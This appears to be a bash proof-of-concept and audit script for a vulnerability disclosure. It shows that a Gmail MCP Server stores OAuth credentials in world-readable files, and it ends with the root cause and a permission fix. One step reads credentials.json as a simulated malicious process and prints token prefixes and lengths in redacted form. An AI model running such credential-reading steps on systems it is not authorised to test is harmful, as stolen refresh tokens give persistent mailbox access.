#!/usr/bin/env bash
# PoC: Credential Theft via World-Readable File Permissions (H1/F1)
#
# Demonstrates that Gmail MCP Server stores OAuth tokens with default
# file permissions (0644), allowing any local user/process to read them.
#
# Prerequisites:
#   - Gmail MCP Server authenticated (credentials.json exists)
#   - Run as any user on the same system
#
# What this proves:
#   - Refresh tokens are readable by any local process
#   - Access tokens (short-lived) are also exposed
#   - Client secrets from gcp-oauth.keys.json are readable
#   - A stolen refresh token grants persistent Gmail access without re-auth
#
# Taxonomy: TL (Token/Credential Leakage)
# OWASP LLM: LLM02 (Sensitive Information Disclosure)
# Affected: src/index.ts:178 (writeFileSync with no mode), src/index.ts:109 (copyFileSync)

set -euo pipefail

CONFIG_DIR="${HOME}/.gmail-mcp"
CRED_FILE="${CONFIG_DIR}/credentials.json"
OAUTH_FILE="${CONFIG_DIR}/gcp-oauth.keys.json"

echo "=== Gmail MCP Server — Credential File Permission Audit ==="
echo ""

# Test 1: Check if config directory exists
if [ ! -d "${CONFIG_DIR}" ]; then
    echo "[!] Config directory ${CONFIG_DIR} does not exist."
    echo "    Server has not been authenticated yet."
    echo "    Run 'node dist/index.js auth' first to create credentials."
    exit 1
fi

# Test 2: Directory permissions
echo "[*] Test A1.1: Config directory permissions"
dir_perms=$(stat -c '%a' "${CONFIG_DIR}" 2>/dev/null || stat -f '%Lp' "${CONFIG_DIR}" 2>/dev/null)
dir_owner=$(stat -c '%U:%G' "${CONFIG_DIR}" 2>/dev/null || stat -f '%Su:%Sg' "${CONFIG_DIR}" 2>/dev/null)
echo "    Path:        ${CONFIG_DIR}"
echo "    Permissions: ${dir_perms}"
echo "    Owner:       ${dir_owner}"
if [ "${dir_perms}" != "700" ]; then
    echo "    [VULNERABLE] Directory is not restricted to owner (expected 0700, got ${dir_perms})"
else
    echo "    [OK] Directory permissions are restrictive"
fi
echo ""

# Test 3: Credential file permissions
echo "[*] Test A1.2: Credentials file permissions"
if [ -f "${CRED_FILE}" ]; then
    cred_perms=$(stat -c '%a' "${CRED_FILE}" 2>/dev/null || stat -f '%Lp' "${CRED_FILE}" 2>/dev/null)
    cred_owner=$(stat -c '%U:%G' "${CRED_FILE}" 2>/dev/null || stat -f '%Su:%Sg' "${CRED_FILE}" 2>/dev/null)
    echo "    Path:        ${CRED_FILE}"
    echo "    Permissions: ${cred_perms}"
    echo "    Owner:       ${cred_owner}"

    if [ "${cred_perms}" != "600" ]; then
        echo "    [VULNERABLE] Credential file is not restricted to owner (expected 0600, got ${cred_perms})"
        echo ""

        # Test 4: Can we actually read the tokens?
        echo "[*] Test A1.3: Token extraction (simulating malicious local process)"
        echo "    Attempting to read credential file..."

        # Extract token fields (redacting actual values for safety)
        if command -v python3 &>/dev/null; then
            python3 -c "
import json, sys

with open('${CRED_FILE}') as f:
    creds = json.load(f)

print('    Fields present:')
for key in creds:
    value = str(creds[key])
    if key in ('refresh_token', 'access_token', 'client_secret'):
        # Show first 10 chars only to prove access without full disclosure
        redacted = value[:10] + '...[REDACTED]'
        print(f'      {key}: {redacted} (length: {len(value)})')
    else:
        print(f'      {key}: {value}')

print()
print('    [CONFIRMED] Refresh token readable — grants persistent Gmail access')
print('    [CONFIRMED] Any local process can steal these credentials')
"
        else
            echo "    (python3 not available, using jq fallback)"
            if command -v jq &>/dev/null; then
                echo "    Keys in credential file:"
                jq -r 'keys[]' "${CRED_FILE}" | sed 's/^/      /'
                echo "    [CONFIRMED] Credential file is readable"
            else
                echo "    Raw file readable: $(head -c 50 "${CRED_FILE}")...[TRUNCATED]"
            fi
        fi
    else
        echo "    [OK] Credential file permissions are restrictive"
    fi
else
    echo "    [!] Credentials file not found at ${CRED_FILE}"
    echo "    Server not yet authenticated"
fi
echo ""

# Test 5: OAuth keys file permissions
echo "[*] Test A1.4: OAuth keys file permissions"
if [ -f "${OAUTH_FILE}" ]; then
    oauth_perms=$(stat -c '%a' "${OAUTH_FILE}" 2>/dev/null || stat -f '%Lp' "${OAUTH_FILE}" 2>/dev/null)
    echo "    Path:        ${OAUTH_FILE}"
    echo "    Permissions: ${oauth_perms}"
    if [ "${oauth_perms}" != "600" ]; then
        echo "    [VULNERABLE] OAuth keys file readable (contains client_id and client_secret)"
    fi
else
    echo "    [!] OAuth keys file not found"
fi
echo ""

# Test 6: Check umask to predict future file permissions
echo "[*] Test A1.5: Current umask (predicts permissions for new credential files)"
current_umask=$(umask)
echo "    umask: ${current_umask}"
if [ "${current_umask}" = "0022" ] || [ "${current_umask}" = "022" ]; then
    echo "    [INFO] Default umask 022 — new files will be 0644 (world-readable)"
    echo "    [INFO] This confirms the vulnerability: fs.writeFileSync without mode arg"
    echo "           at src/index.ts:178 will create world-readable credential files"
fi

echo ""
echo "=== Summary ==="
echo "Root cause: fs.writeFileSync(CREDENTIALS_PATH, JSON.stringify(tokens))"
echo "            at src/index.ts:178 — no 'mode' argument specified"
echo "Fix:        fs.writeFileSync(path, data, { mode: 0o600 })"
echo "            fs.mkdirSync(path, { recursive: true, mode: 0o700 })"
